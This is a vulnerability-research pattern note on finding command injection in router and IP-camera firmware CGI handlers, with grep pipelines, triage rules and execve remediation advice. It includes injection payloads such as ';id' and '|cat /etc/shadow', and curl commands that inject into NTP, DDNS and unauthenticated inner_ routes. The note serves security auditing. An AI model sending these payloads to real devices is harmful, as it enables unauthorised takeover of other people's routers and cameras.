---
type: pattern
title: Pattern - Firmware CGI Command Injection Grep
tags: [pattern, cwe-78, firmware, cgi, command-injection, grep, iot, router, ip-camera, shell-script, qnap, dlink, acti, lilin, planet, bb-pattern]
status: verified
severity_range: P1-P2 (pre-auth) / P2-P3 (post-auth)
precedents: common on consumer router / IP-camera CGI stacks (10-30 CGI injections per image; DDNS/PPPoE/NTP fields on cameras; vendor exec wrappers and inner_ CGI auth-bypass routes)
last_updated: 2026-06-04
---

# Pattern - Firmware CGI Command Injection Grep

## TL;DR

Router/IoT firmware CGI binaries frequently pass HTTP parameters directly to `system()` / `popen()` / `exec()` without sanitization. A systematic grep + one-level traceback finds them in bulk.

## Detection Pipeline

### Step 1: Extract the firmware

```bash
# binwalk extraction
binwalk -e firmware.bin
cd _firmware.bin.extracted/squashfs-root/

# or use jefferson for JFFS2, ubi_reader for UBI
```

### Step 2: Identify CGI binaries

```bash
# common locations
find . -path "*/cgi-bin/*" -o -path "*/www/*.cgi" -o -name "goform" -o -name "goahead" | head -20

# check architecture
file usr/sbin/httpd   # MIPS/ARM/x86 — determines the IDA/Ghidra profile
```

### Step 3: Grep for dangerous sinks

```bash
# primary sinks (command injection)
grep -rn "system\(\|popen\(\|execve\(\|exec(\|doSystemCmd\|twsystem\|CsteSystem" \
  usr/sbin/httpd www/ cgi-bin/ 2>/dev/null

# secondary sinks (may wrap system())
grep -rn "doShell\|run_cmd\|ExeCmd\|SYSTEM_CMD\|SystemCmd" \
  usr/sbin/ www/ 2>/dev/null

# vendor-specific wrappers (common among Chinese vendors)
grep -rn "formDefineTriggerCGI\|websGetVar\|web_get\|getCgiVar" \
  usr/sbin/httpd 2>/dev/null
```

### Step 4: Trace the parameter source (one level back)

For each `system()` hit, trace the variable back ONE function:

```
system(cmd)
  ↑ sprintf(cmd, "ping %s", ip)
    ↑ ip = websGetVar(wp, "pingAddr", "")
      ↑ HTTP parameter: pingAddr
```

**Key question**: is the HTTP parameter user-controlled AND unsanitized?

### Step 5: Classify — pre-auth vs. post-auth

```bash
# check whether the CGI endpoint requires authentication
# look for session/cookie checks before the vulnerable function
grep -B 20 "system(" usr/sbin/httpd | grep -i "session\|cookie\|auth\|login\|token"

# check httpd.conf / goahead config for ACLs
cat etc/lighttpd/lighttpd.conf | grep -A5 "cgi-bin"
cat etc/goahead/goahead.conf | grep -i "auth"
```

## Common Vulnerable Patterns (pseudocode)

### Pattern A: Direct sprintf → system

```c
// CRITICAL: no sanitization
void formPing(webs_t wp) {
    char *ip = websGetVar(wp, "pingAddr", "");
    char cmd[256];
    sprintf(cmd, "ping -c 3 %s", ip);  // ← injection point
    system(cmd);                         // ← sink
}
// exploit: pingAddr=;id
```

### Pattern B: concatenation in a shell command

```c
// common in diagnostic pages
char *host = get_cgi("hostname");
sprintf(buf, "nslookup %s 2>&1", host);
popen(buf, "r");
// exploit: hostname=|cat /etc/shadow
```

### Pattern C: a vendor wrapper hiding system()

```c
// a wrapper (e.g. "twsystem") that looks custom but IS system()
void formSetRoute(webs_t wp) {
    char *gw = websGetVar(wp, "gateway", "");
    char cmd[512];
    sprintf(cmd, "route add default gw %s", gw);
    twsystem(cmd);  // looks custom, IS system()
}
```

## Bulk Audit Workflow

```bash
# 1. extract all system() call sites with context
grep -n "system\|popen\|execve" httpd_binary_strings.txt | tee /tmp/sinks.txt

# 2. cross-reference with HTTP parameter names
grep -oP 'websGetVar\(wp,\s*"[^"]*"' httpd_binary_strings.txt | sort -u | tee /tmp/params.txt

# 3. for each parameter that feeds a sink → a finding
# priority: pre-auth endpoints > post-auth > debug-only

# 4. dedup by root cause
# the same sprintf pattern across 5 form handlers = 1 finding (multiple affected endpoints)
# different parameter types (ping vs traceroute vs DNS) = separate findings
```

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Pre-auth + direct system() + internet-facing | **P1 Critical** |
| Pre-auth + direct system() + LAN only | **P1-P2** |
| Post-auth admin + system() | **P2-P3** (depends on vendor stance) |
| Post-auth non-admin + system() | **P2** |
| Debug/diagnostic page only | **P3** |

## Yield Expectations

| Vendor type | Typical findings per firmware image |
|-------------|--------------------------------------|
| Chinese consumer routers | **10-30** CGI injections |
| Enterprise-grade (Cisco, Aruba) | 0-2 (heavily audited) |
| IoT cameras | 5-15 |
| Mid-tier router/NAS vendors | 3-10 |

## Anti-Patterns to Avoid

1. **Don't report each endpoint separately when the root cause is the same** — "formPing, formTraceroute, formNslookup all lack input sanitization" = 1 finding
2. **Don't skip post-auth** — many vendors treat post-auth command injection as a valid bug
3. **Don't forget to check MIPS/ARM string encoding** — `strings` may miss UTF-16 or compressed strings; use `strings -eL` for little-endian
4. **Don't assume httpd is the only binary** — check `miniupnpd`, `telnetd`, `boa`, and custom daemons

## Extended Sub-Patterns (2026-06)

> The following six sub-patterns fill in blind spots the base grep pipeline (Steps 1-4, focused on router httpd binaries + diagnostic pages) misses. Use these when the base pipeline's signal is low, or when auditing IP-camera firmware, an OEM shell-script layer, or QNAP-based firmware.

### 4A: IP-camera high-density injection zone (network settings fields)

Router firmware CGI injections cluster in diagnostic pages (ping/traceroute/nslookup); IP-camera firmware clusters instead in **network settings fields**, because testers tend to focus only on the video/streaming path. IP-camera audits confirm these fields are the highest-yield target.

| Field pattern | Example HTTP params | Notes |
|---|---|---|
| DDNS hostname | `ddns_host`, `ddnsHostname`, `dyndns_host` | often passed directly to a shell command that invokes an update client |
| DDNS user/pass | `ddns_user`, `ddns_pwd` | password fields are often skipped by sanitization |
| PPPoE credentials | `pppoe_user`, `pppoe_pass`, `pppoe_server` | the server field is often unfiltered |
| NTP server | `ntp_server`, `ntpServer`, `time_server` | `ntpdate <ntp_server>` is a classic direct pass-through |
| Timezone | `timezone`, `tz` | some vendors run `timedatectl set-timezone $tz` |
| MAC (clone) | `mac_addr`, `clonedMac` | `ifconfig eth0 hw ether $mac` with no validation |

```bash
# strings-based (when the binary can't be quickly decompiled)
strings usr/sbin/httpd | grep -i "ddns\|pppoe\|ntp\|timezone\|timedatectl\|ntpdate\|ifconfig.*ether"

# source-available OEM firmware
grep -rn "ddns_host\|ntpServer\|ntp_server\|pppoe_server\|clonedMac" src/ include/ cgi/ 2>/dev/null

# trace down from the form handler
grep -n "websGetVar.*ddns\|websGetVar.*ntp\|websGetVar.*pppoe\|websGetVar.*mac" usr/sbin/httpd.c 2>/dev/null
```

Exploit example (unauthenticated NTP/DDNS fields on multiple camera models):

```bash
curl -s -X POST "http://TARGET/cgi-bin/admin/setNetworkNTP" \
  -d "ntp_server=time.nist.gov;id" --cookie "session=<token>"

curl -s -X POST "http://TARGET/cgi-bin/admin/setDDNS" \
  -d "ddns_host=myhost.dyndns.org;id;echo&ddns_user=user&ddns_pwd=pass" --cookie "session=<token>"
```

**Evidence requirement**: injected command output must appear in the HTTP response or a log endpoint, otherwise do not claim RCE (`verified_evidence: live` / `source_code`).

### 4B: OEM shell-script unquoted-variable grep

Compiled CGI binaries get most of the attention, but OEM firmware often ships **shell scripts** wrapping configuration operations. Unquoted shell variables in these scripts are direct command-injection points, and are triggered via the same HTTP parameters.

```sh
# unquoted $1: an NTP server value from an HTTP param — injectable
set_ntp()    { ntpdate $1; }
# sed with an unquoted variable
update_ddns(){ sed -i "s/$OLD_HOST/$NEW_HOST/g" /etc/ddns.conf; }
# multiple unquoted params
do_ping()    { ping -c 3 $1 $2 $3; }
```

```bash
# find shell scripts
find . -name "*.sh" -o -name "*.cgi" | xargs file 2>/dev/null | grep "shell script" | cut -d: -f1

# unquoted positional params
grep -rn '\$[1-9]\b' sbin/ etc/ usr/bin/ usr/sbin/ --include="*.sh" | grep -v '"' | grep -v "^#"

# unquoted named variables inside dangerous commands
grep -rn "system\|popen\|exec\|ntpdate\|wget\|curl\|ifconfig\|route\|ping\|traceroute" \
  $(find . -name "*.sh") | grep '\$[A-Z_a-z][A-Z_a-z0-9]*' | grep -v '"$'

# sed variable expansion
grep -rn "sed.*\$" $(find . -name "*.sh") | grep -v '"$'
```

**Triage rule**: a positional (`$1`/`$2`/`$3`) or named (`$HOST`/`$SERVER`) variable used unquoted inside a dangerous command = injectable, provided the variable originates from an HTTP param or an HTTP-writable config file. Confirm the chain: `CGI handler → shell script → dangerous command`.

**Precedent**: four different network-settings scripts (`set_ntp.sh` / `set_ddns.sh` / `set_pppoe.sh` / `set_mac.sh`) on the same firmware image, all sharing the same root cause (unquoted variables). Report this as "one root cause, four affected endpoints" — not four independent root-cause findings.

### 4C: vendor CGI wrapper filtering (QNAP)

QNAP firmware has a large number of CGI binaries, most of which call `qnap_exec()` — a wrapper that sanitizes the command string first. Spending analysis time on binaries that only use `qnap_exec()` yields zero results — filter these out first.

```bash
# 1. list all CGI candidates
find . -path "*/cgi-bin/*" -type f | sort > /tmp/cgi_candidates.txt

# 2. filter out binaries that import qnap_exec (the safe wrapper)
for f in $(cat /tmp/cgi_candidates.txt); do
    strings "$f" | grep -q "qnap_exec" || echo "$f"
done > /tmp/cgi_no_qnap_exec.txt

# 3. sort remaining binaries by system()/popen() call count (more = higher priority)
for f in $(cat /tmp/cgi_no_qnap_exec.txt); do
    echo "$(strings "$f" | grep -c "system\|popen") $f"
done | sort -rn | head -20

# 4. within the top candidates, count unique command strings (more variety = larger attack surface)
strings /path/to/candidate_cgi | grep -oP '"[^"]{10,80}"' | grep -E "sh|cmd|exec|ping|nslookup" | sort -u
```

**Decision rule**: a binary that imports `qnap_exec` and has no additional `system()`/`popen()` outside the wrapper → skip. Only invest time in binaries that (a) have no `qnap_exec` at all, or (b) have `system()`/`popen()` calls that bypass `qnap_exec`.

### 4D: double-quote bypass testing — `"%s"` wrapping is not SAFE

A common false-negative: seeing `system("%s", user_input)` and marking it SAFE just because "the format string is double-quote wrapped." That's wrong. Double quotes only prevent shell word-splitting — they do not prevent command injection if:

1. The invoked shell is `sh -c "... \"$input\" ..."` — backticks / `$(...)` inside the double quotes still work.
2. `system()` receives the already-expanded string directly — the quotes only protect at the shell-invocation layer, not before.

```bash
# stage 1: basic delimiters (can ; or | break out?)
curl -s -X POST "http://TARGET/cgi-bin/test" -d 'param=;id'

# stage 2: if stage 1 is blocked, test backticks / $() inside double quotes
curl -s -X POST "http://TARGET/cgi-bin/test" --data-urlencode 'param=`id`'
curl -s -X POST "http://TARGET/cgi-bin/test" --data-urlencode 'param=$(id)'

# stage 3: newline injection (bypasses some naive sanitizers)
PAYLOAD=$'valid_value\nid'
curl -s -X POST "http://TARGET/cgi-bin/test" --data-urlencode "param=$PAYLOAD"
```

Analysis-note convention:

```
[audit:static] system("%s", user_input) — observed double-quote wrapping.
MUST run the two-stage bypass test (backtick/$() inside double quotes) before marking SAFE.
Status: pending-dynamic
```

Only mark `[SAFE]` after both stages are tested, or the call site is proven sanitized upstream.

### 4E: inner_ CGI auth bypass (D-Link)

Some D-Link routers (and other vendors) register two sets of CGI handlers: a standard route (with an auth check) and an `inner_`-prefixed route (no auth). The `inner_` prefix was originally meant for daemon-to-daemon internal calls, but is often directly reachable from the LAN or even the WAN interface. This pattern is confirmed across multiple D-Link devices.

```bash
# find the inner_ prefix in the CGI registration table
strings usr/sbin/httpd | grep -i "inner_" | head -30

# IDA/Ghidra: find the CGI dispatch table, check the auth-flag column
# pattern: websRegisterCgi("inner_<name>", handler, 0)  ← auth=0 = no check

# string-based (if the CGI path is stored as a string)
strings usr/sbin/httpd | grep -E "^/?(cgi-bin/)?(inner_|_inner)[a-zA-Z]" | sort -u

# cross-reference against the httpd ACL
cat etc/lighttpd/lighttpd.conf etc/goahead/*.conf 2>/dev/null | grep -i "inner_"
```

```bash
# access an inner_ CGI with no session cookie
curl -s "http://TARGET/cgi-bin/inner_setNetwork?param=test;id" -v

# some vendors require a specific User-Agent / Referer
curl -s "http://TARGET/cgi-bin/inner_setNetwork?param=test;id" \
  -H "Referer: http://TARGET/" -H "User-Agent: Mozilla/5.0" -v
```

**A text-redirect variant** (seen on some camera/router vendors): an HTTP 302 or plaintext Location header distinguishes authenticated/unauthenticated admin paths. If the redirect target is an `inner_` or `_admin` path, it's often unauthenticated:

```bash
curl -s -o /dev/null -w "%{redirect_url}\n" "http://TARGET/cgi-bin/admin/setConfig"
# redirect_url containing inner_ → hit that inner_ URL directly, no cookie needed
```

**Triage rule**: any CGI route with an auth flag = 0 (or equivalent "no auth required" constant) that contains `system()`/`popen()` = a **pre-auth RCE candidate**. Confirm reachability with no valid session token present.

### 4F: execve remediation guidance

The base pattern documents the vulnerability but doesn't prescribe a fix. Findings/reports should include a concrete remediation path. The root problem with `system()`/`popen()` is that they invoke a shell that interprets metacharacters; `execve()` does not invoke a shell.

```c
// vulnerable:
char cmd[256];
sprintf(cmd, "ping -c 3 %s", user_input);
system(cmd);  // the shell interprets ; | ` $() etc.

// recommended — execve does not invoke a shell, metacharacters are inert:
const char *argv[] = { "/bin/ping", "-c", "3", user_input, NULL };
execve("/bin/ping", (char * const *)argv, NULL);  // user_input is a literal argument
```

Additional hardening:

1. Validate `user_input` against an allowlist (IP / hostname regex) before exec.
2. When output needs to be captured, use `pipe()` + `fork()` + `execve()` instead of `popen()`.
3. If `system()` cannot be replaced immediately: reject input containing `;` `|` `` ` `` `$` `(` `)` `\n` `\r` `<` `>`.
4. Compile-time hardening: `-fstack-protector-strong` `-D_FORTIFY_SOURCE=2` `-Wformat=2`.

> A report that documents `system()` but doesn't suggest an `execve()` replacement often triggers a clarification round-trip from the vendor. Attaching a fix reduces back-and-forth during triage.

### Extended Sub-Pattern Summary Table

| Sub-pattern | Key signal | Precedent |
|---|---|---|
| 4A: IP-camera high-density fields | DDNS/PPPoE/NTP/timezone/MAC params | IP cameras |
| 4B: OEM shell unquoted variables | `*.sh` with unquoted `$1`/`$VAR` | consumer IoT vendors |
| 4C: QNAP wrapper filtering | filter out `qnap_exec` imports first | QNAP CGI analysis |
| 4D: double-quote bypass | `system("%s")` ≠ SAFE — test backtick/`$()` | router/NAS vendors |
| 4E: inner_ auth bypass | `inner_`-prefixed CGI = auth flag 0 | D-Link-class vendors |
| 4F: execve remediation | replace `system()`/`popen()` with `execve()` | all firmware reports |

## Related Patterns

- [[Pattern - Hardcoded Credentials]] — often found alongside CGI injection in the same firmware
- [[Pattern - Default Credentials in Firmware]]
